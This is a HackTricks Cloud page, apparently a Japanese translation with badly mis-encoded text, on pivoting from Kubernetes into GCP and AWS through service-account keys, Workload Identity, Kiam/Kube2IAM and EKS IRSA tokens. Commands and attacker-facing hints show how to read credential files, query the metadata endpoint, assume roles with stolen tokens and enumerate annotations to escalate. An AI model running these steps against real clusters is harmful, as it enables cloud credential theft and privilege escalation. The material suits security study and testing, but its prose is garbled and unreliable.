# Kubernetesã‚’ä½¿ç”¨ã—ãŸã‚¯ãƒ©ã‚¦ãƒ‰ã¸ã®ãƒ”ãƒœãƒƒãƒˆ

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ã”ç¢ºèªãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## GCP

GCPå†…ã§k8sã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹å ´åˆã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒGCPã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã¤ã“ã¨ãŒå¿…è¦ã«ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯2ã¤ã‚ã‚Šã¾ã™ã€‚

### GCP-SAã‚­ãƒ¼ã‚’ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¨ã—ã¦ãƒã‚¦ãƒ³ãƒˆã™ã‚‹

Kubernetesã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«GCPã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ä¸ãˆã‚‹ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ã€‚

* GCPã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã™ã‚‹
* å¿…è¦ãªæ¨©é™ã‚’ãƒã‚¤ãƒ³ãƒ‰ã™ã‚‹
* ä½œæˆã—ãŸSAã®JSONã‚­ãƒ¼ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹
* ãƒãƒƒãƒ‰å†…ã§ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¨ã—ã¦ãƒã‚¦ãƒ³ãƒˆã™ã‚‹
* GOOGLE\_APPLICATION\_CREDENTIALSç’°å¢ƒå¤‰æ•°ã‚’ä½œæˆã—ã€JSONãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹ã‚’æŒ‡å®šã™ã‚‹ã€‚

{% hint style="warning" %}
ã—ãŸãŒã£ã¦ã€**æ”»æ’ƒè€…**ã¨ã—ã¦ã€ãƒãƒƒãƒ‰å†…ã®ã‚³ãƒ³ãƒ†ãƒŠã‚’ä¾µå®³ã—ãŸå ´åˆã€ãã®**ç’°å¢ƒå¤‰æ•°**ã¨GCPã®**èªè¨¼æƒ…å ±**ã‚’æŒã¤**JSONãƒ•ã‚¡ã‚¤ãƒ«**ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

### GSAã®JSONã‚’KSAã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã«é–¢é€£ä»˜ã‘ã‚‹

GSAã‚’GKEã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã•ã›ã‚‹æ–¹æ³•ã¯ã€æ¬¡ã®ã‚ˆã†ã«ãƒã‚¤ãƒ³ãƒ‰ã™ã‚‹ã“ã¨ã§ã™ã€‚åŒã˜åå‰ç©ºé–“å†…ã§GKEã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã¨Kubernetesã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* GKE ã‚¯ãƒ©ã‚¹ã‚¿ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’ä»˜ä¸ã™ã‚‹ãŸã‚ã«ã€GCP ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®è³‡æ ¼æƒ…å ±ã‚’å«ã‚€ Kubernetes Secret ã‚’ä½œæˆã—ã¾ã™ã€‚æ¬¡ã®ä¾‹ã«ç¤ºã™ã‚ˆã†ã«ã€`gcloud` ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã“ã‚Œã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

```plaintext
gcloud iam service-accounts keys create key.json --iam-account=[SERVICE_ACCOUNT_EMAIL]
kubectl create secret generic gcp-key --from-file=key.json
```
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€Kubernetesã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’Kubernetesã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãƒã‚¤ãƒ³ãƒ‰ã—ã¾ã™ã€‚
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
ç¬¬2ã‚¹ãƒ†ãƒƒãƒ—ã§ã¯ã€GSAã®è³‡æ ¼æƒ…å ±ã‚’KSAã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¨ã—ã¦è¨­å®šã—ã¾ã—ãŸã€‚ãã®å¾Œã€GKEã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®å†…éƒ¨ã‹ã‚‰ãã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€ãã®GCPã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã§ãã¾ã™ã€‚
{% endhint %}

### GKEãƒ¯ãƒ¼ã‚¯ãƒ­ãƒ¼ãƒ‰ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£

ãƒ¯ãƒ¼ã‚¯ãƒ­ãƒ¼ãƒ‰ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€[Kubernetesã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)ã‚’[Googleã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ](https://cloud.google.com/iam/docs/understanding-service-accounts)ã¨ã—ã¦æ©Ÿèƒ½ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ Kubernetesã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§å®Ÿè¡Œã•ã‚Œã‚‹ãƒãƒƒãƒ‰ã¯ã€Google Cloud APIã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹éš›ã«è‡ªå‹•çš„ã«Googleã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¨ã—ã¦èªè¨¼ã•ã‚Œã¾ã™ã€‚

ã“ã®å‹•ä½œã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã®**æœ€åˆã®ä¸€é€£ã®æ‰‹é †**ã¯ã€GCPã§**ãƒ¯ãƒ¼ã‚¯ãƒ­ãƒ¼ãƒ‰ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’æœ‰åŠ¹ã«ã™ã‚‹**ã“ã¨ã§ã™ï¼ˆ[**æ‰‹é †**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)ï¼‰ãŠã‚ˆã³k8sãŒãªã‚Šã™ã¾ã™GCP SAã‚’ä½œæˆã—ã¾ã™ã€‚

* æ–°ã—ã„ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã§**ãƒ¯ãƒ¼ã‚¯ãƒ­ãƒ¼ãƒ‰ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’æœ‰åŠ¹ã«ã™ã‚‹**

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
* **æ–°ã—ã„ãƒãƒ¼ãƒ‰ãƒ—ãƒ¼ãƒ«ã®ä½œæˆ/æ›´æ–°**ï¼ˆAutopilotã‚¯ãƒ©ã‚¹ã‚¿ã¯ä¸è¦ã§ã™ï¼‰

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* K8sã‹ã‚‰GCPã®æ¨©é™ã‚’æŒã¤**GCPã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆ**ã—ã¾ã™:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼**ã«**æ¥ç¶š**ã—ã€ä½¿ç”¨ã™ã‚‹ãŸã‚ã®**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã‚’**ä½œæˆ**ã—ã¾ã™

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **GSAã¨KSAã‚’ãƒã‚¤ãƒ³ãƒ‰ã™ã‚‹**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* **KSA**ã¨ä¸€ç·’ã«**pod**ã‚’å®Ÿè¡Œã—ã€**GSA**ã¸ã®**ã‚¢ã‚¯ã‚»ã‚¹**ã‚’ç¢ºèªã—ã¾ã™ï¼š
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
{% hint style="warning" %}
K8så†…ã®æ”»æ’ƒè€…ã¨ã—ã¦ã€GCPã®ä½•ã‹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã“ã¨ã‚’ç¤ºã™**`iam.gke.io/gcp-service-account`ã‚¢ãƒãƒ†ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’æŒã¤**SAsã‚’æ¤œç´¢**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®å„KSAã‚’æ‚ªç”¨ã—ã€ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã‚‚ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ã™ã€‚\
GCPã‹ã‚‰ã¯ã€ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ã‚’åˆ—æŒ™ã—ã€Kuberneteså†…ã®SAã«ä¸ãˆã‚‰ã‚Œã‚‹**ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’æŠŠæ¡ã™ã‚‹**ã“ã¨ãŒå¸¸ã«èˆˆå‘³æ·±ã„ã§ã™ã€‚
{% endhint %}

ä»¥ä¸‹ã¯ã€ãã®**ã‚¢ãƒãƒ†ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’æ¢ã™ãŸã‚ã«ã€**ã™ã¹ã¦ã®ãƒãƒƒãƒ‰å®šç¾©ã‚’ç°¡å˜ã«åå¾©å‡¦ç†ã™ã‚‹**ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ã€‚
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAMï¼ˆPodç”¨ã®IAMãƒ­ãƒ¼ãƒ«ï¼‰ <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

IAMãƒ­ãƒ¼ãƒ«ã‚’Podã«ä¸ãˆã‚‹ï¼ˆå¤ã„ï¼‰æ–¹æ³•ã¯ã€[**Kiam**](https://github.com/uswitch/kiam)ã¾ãŸã¯[**Kube2IAM**](https://github.com/jtblin/kube2iam) **ã‚µãƒ¼ãƒãƒ¼**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚åŸºæœ¬çš„ã«ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§ç‰¹æ¨©ã®IAMãƒ­ãƒ¼ãƒ«ã‚’æŒã¤**ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆ**ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆã¯ã€å¿…è¦ãªãƒãƒƒãƒ‰ã«IAMãƒ­ãƒ¼ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã™ã‚‹å½¹å‰²ã‚’æœãŸã—ã¾ã™ã€‚

ã¾ãšã€**ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹å†…ã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ãƒ­ãƒ¼ãƒ«ã‚’è¨­å®šã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå†…ã®ã‚¢ãƒãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã§è¡Œã„ã¾ã™ã€‚

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ãŒIAMãƒ­ãƒ¼ãƒ«ã§è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€Podã®å®šç¾©ã”ã¨ã«å¸Œæœ›ã™ã‚‹ãƒ­ãƒ¼ãƒ«ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ãªæ–¹æ³•ã§æŒ‡å®šã—ã¾ã™ã€‚

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
æ”»æ’ƒè€…ã¨ã—ã¦ã€ã‚‚ã—ãƒãƒƒãƒ‰ã‚„ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã€ã¾ãŸã¯kube-systemã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹kiam/kube2iamã‚µãƒ¼ãƒãƒ¼ã§ã“ã‚Œã‚‰ã®æ³¨é‡ˆã‚’è¦‹ã¤ã‘ãŸå ´åˆã€æ—¢ã«ãƒãƒƒãƒ‰ã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å½¹å‰²ã ã‘ã§ãªãã€ãã‚Œä»¥ä¸Šã®å½¹å‰²ã‚’ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ï¼ˆAWSã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ãŒã‚ã‚‹å ´åˆã¯ã€å½¹å‰²ã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼‰ã€‚
{% endhint %}

#### IAMãƒ­ãƒ¼ãƒ«ã‚’æŒã¤ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹

{% hint style="info" %}
æŒ‡å®šã™ã‚‹IAMãƒ­ãƒ¼ãƒ«ã¯ã€kiam/kube2iamãƒ­ãƒ¼ãƒ«ã¨åŒã˜AWSã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã€ãã®ãƒ­ãƒ¼ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAMãƒ­ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ãŸK8sã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®OIDCçµŒç”±<a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

ã“ã‚Œã¯AWSã«ã‚ˆã£ã¦æ¨å¥¨ã•ã‚Œã‚‹æ–¹æ³•ã§ã™ã€‚

1. ã¾ãšã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ãŸã‚ã«[OIDCãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’ä½œæˆã—ã¾ã™](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html)ã€‚
2. æ¬¡ã«ã€SAãŒå¿…è¦ã¨ã™ã‚‹æ¨©é™ã‚’æŒã¤IAMãƒ­ãƒ¼ãƒ«ã‚’ä½œæˆã—ã¾ã™ã€‚
3. IAMãƒ­ãƒ¼ãƒ«ã¨SAã®é–“ã«[ä¿¡é ¼é–¢ä¿‚ã‚’ä½œæˆã—ã¾ã™](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html)ã€‚_ä¿¡é ¼é–¢ä¿‚ã¯ä¸»ã«OIDCãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼åã€åå‰ç©ºé–“åã€ãŠã‚ˆã³SAåã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™_ã€‚
4. æœ€å¾Œã«ã€**ãƒ­ãƒ¼ãƒ«ã®ARNã‚’ç¤ºã™æ³¨é‡ˆã‚’æŒã¤SAã‚’ä½œæˆã—ã¾ã™**ã€‚ãã®SAã§å®Ÿè¡Œã•ã‚Œã‚‹ãƒãƒƒãƒ‰ã¯ã€**ãƒ­ãƒ¼ãƒ«ã®ãƒˆãƒ¼ã‚¯ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™**ã€‚**ãƒˆãƒ¼ã‚¯ãƒ³**ã¯**ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¾ã‚Œ**ã€ãƒ‘ã‚¹ã¯**`AWS_WEB_IDENTITY_TOKEN_FILE`**ã§æŒ‡å®šã•ã‚Œã¾ã™ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆï¼š`/var/run/secrets/eks.amazonaws.com/serviceaccount/token`ï¼‰ã€‚
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
`/var/run/secrets/eks.amazonaws.com/serviceaccount/token`ã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦awsã‚’å–å¾—ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
æ”»æ’ƒè€…ã¨ã—ã¦ã€K8sã‚¯ãƒ©ã‚¹ã‚¿ã‚’åˆ—æŒ™ã§ãã‚‹å ´åˆã€**ãã®æ³¨é‡ˆã‚’æŒã¤ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€**AWSã¸ã®ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’ç¢ºèªã§ãã¾ã™ã€‚ãã®ãŸã‚ã«ã¯ã€IAMã®**ç‰¹æ¨©ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã®1ã¤ã‚’ä½¿ç”¨ã—ã¦ã€**ãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œ/ä½œæˆ**ã—ã€ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€ã ã‘ã§ã™ã€‚

ã•ã‚‰ã«ã€ãƒãƒƒãƒ‰å†…ã«ã„ã‚‹å ´åˆã¯ã€**AWS\_ROLE\_ARN**ã‚„**AWS\_WEB\_IDENTITY\_TOKEN**ãªã©ã®ç’°å¢ƒå¤‰æ•°ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

{% hint style="danger" %}
æ™‚ã«ã¯ã€**ãƒ­ãƒ¼ãƒ«ã®ä¿¡é ¼ãƒãƒªã‚·ãƒ¼**ãŒ**èª¤ã£ã¦è¨­å®š**ã•ã‚Œã¦ãŠã‚Šã€æœŸå¾…ã•ã‚Œã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«å¯¾ã—ã¦AssumeRoleã‚¢ã‚¯ã‚»ã‚¹ã‚’ä¸ãˆã‚‹ä»£ã‚ã‚Šã«ã€**ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã«ä¸ãˆã¦ã—ã¾ã†ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€åˆ¶å¾¡ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«æ³¨é‡ˆã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚‹å ´åˆã€ãã®ãƒ­ãƒ¼ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€**ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„**ï¼š
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ãƒãƒƒãƒ‰ã¨SAsã®IAMãƒ­ãƒ¼ãƒ«ã‚’æ¤œç´¢ã™ã‚‹

ã“ã‚Œã¯ã€**ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã¨SAsã®å®šç¾©ã‚’ç°¡å˜ã«ç¹°ã‚Šè¿”ã—å‡¦ç†**ã—ã€ãã®**æ³¨é‡ˆ**ã‚’æ¢ã™ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ï¼š
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### ãƒãƒ¼ãƒ‰ã®IAMãƒ­ãƒ¼ãƒ«

